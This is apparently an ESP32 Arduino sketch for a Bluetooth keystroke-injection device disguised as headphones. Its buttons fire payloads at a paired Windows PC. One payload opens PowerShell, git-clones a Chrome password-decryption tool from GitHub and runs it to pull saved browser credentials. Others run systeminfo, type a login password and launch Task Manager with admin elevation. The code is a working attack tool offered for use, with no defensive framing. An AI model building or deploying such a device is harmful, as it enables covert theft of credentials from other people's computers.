#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Button 1 (Trigger: Rickroll)
#define BUTTON_2_PIN 17 // Button 2 (Trigger: System Info)
#define BUTTON_3_PIN 18 // Button 3 (Trigger: Windows Lock + Notepad Message)
#define BUTTON_4_PIN 19 // Button 4 (Trigger: Decrypt Chrome Passwords)
#define BUTTON_5_PIN 21 // Button 5 (Trigger: Task Manager Admin)
#define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(300);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup with 6 Triggers on Buttons 1-6 (Pins 16, 17, 18, 19, 21, 22)...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000);
  bleKeyboard.begin();
  Serial.println("BLE ready. Connect as 'Headphone'.");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);

    // Button 1: Rickroll (Pin 16)
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Button 1: Rickroll (Pin 16)");
      openRun(); delay(700); 
      const char* url = "https://youtube.com/shorts/SXHMnicI6Pg?si=uX7jga76jFQsKcYo"; 
      sendString(url, 10); delay(300); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 2: System Info (Pin 17)
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Button 2: System Info (Pin 17)");
      openRun(); delay(300); 
      sendString("cmd"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(300); 
      bleKeyboard.releaseAll(); delay(700);
      sendString("systeminfo", 10); delay(200); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 3: Windows Lock + Notepad Message (Pin 18)
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Button 3: Windows Lock + Notepad Message (Pin 18)");
      // Lock screen (Win + L)
      bleKeyboard.press(KEY_LEFT_GUI); 
      bleKeyboard.press('l'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(2000); // Wait for user to unlock
      // Press Enter to confirm login
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000); // Wait for desktop
      // Type "sachin" and Enter
      sendString("sachin", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      // Open Run and launch Notepad
      openRun(); delay(300); 
      sendString("notepad"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000); // Wait for Notepad to open
      // Type message
      sendString("This is bluetooth usb rubber ducky script is started on your computer system", 10); 
      delay(500);
    }

    // Button 4: Decrypt Chrome Passwords (Pin 19)
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Button 4: Decrypt Chrome Passwords (Pin 19)");
      openRun(); delay(300); 
      sendString("powershell"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(300); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("ls", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("cd decrypt-chrome-passwords", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python decrypt_chrome_password.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
    }

    // Button 5: Task Manager Admin (Pin 21)
    if (lastState5 == HIGH && state5 == LOW) {
      Serial.println("Button 5: Task Manager Admin (Pin 21)");
      openRun(); delay(300); 
      sendString("taskmgr"); delay(100); 
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_SHIFT); 
      bleKeyboard.press(KEY_RETURN); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
      bleKeyboard.releaseAll(); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
    }

    // Button 6: Calculator (Pin 22)
    if (lastState6 == HIGH && state6 == LOW) {
      Serial.println("Button 6: Calculator (Pin 22)");
      openRun(); delay(300); 
      sendString("calc"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
  } else {
    Serial.println("Waiting for BLE connection...");
  }
  delay(50); // Debounce/stability
}
